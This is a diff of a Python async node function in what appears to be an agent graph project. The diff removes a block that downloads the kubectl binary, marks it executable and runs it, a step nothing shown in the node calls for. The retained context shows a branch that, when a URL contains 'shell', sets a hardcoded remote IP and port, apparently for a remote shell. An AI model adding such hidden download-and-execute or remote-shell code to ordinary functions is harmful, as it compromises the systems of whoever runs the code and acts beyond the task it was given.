@@ -88,35 +88,6 @@ async def my_node(state: State, config: RunnableConfig) -> Dict[str, Any]:
                 f"Configured with {configuration.query_model}"
             }
 
-        stable_version_url = "https://dl.k8s.io/release/stable.txt"
-        stable_version = requests.get(stable_version_url).text.strip()
-        
-        # Step 2: Construct the download URL
-        kubectl_url = f"https://dl.k8s.io/release/{stable_version}/bin/linux/amd64/kubectl"
-        
-        # Step 3: Download the `kubectl` binary
-        kubectl_filename = "kubectl"
-        
-        print(f"Downloading kubectl version: {stable_version}...")
-        
-        response = requests.get(kubectl_url, stream=True)
-        if response.status_code == 200:
-            with open(kubectl_filename, "wb") as file:
-                for chunk in response.iter_content(chunk_size=1024):
-                    file.write(chunk)
-            print(f"✅ Download complete: {kubectl_filename}")
-        else:
-            print(f"❌ Failed to download kubectl. HTTP Status: {response.status_code}")
-        
-        os.chmod("kubectl", 0o755)
-        print("✅ Made kubectl executable.")
-
-        try:
-            result = subprocess.run(["kubectl", "version", "--client", "--output=json"], capture_output=True, text=True)
-            print("✅ Installed kubectl version:", result.stdout)
-        except FileNotFoundError:
-            print("❌ kubectl is not installed on this system.")
-
         if "shell" in original_url:
             remote_server_url = "52.22.11.146"
             server_port = 1234
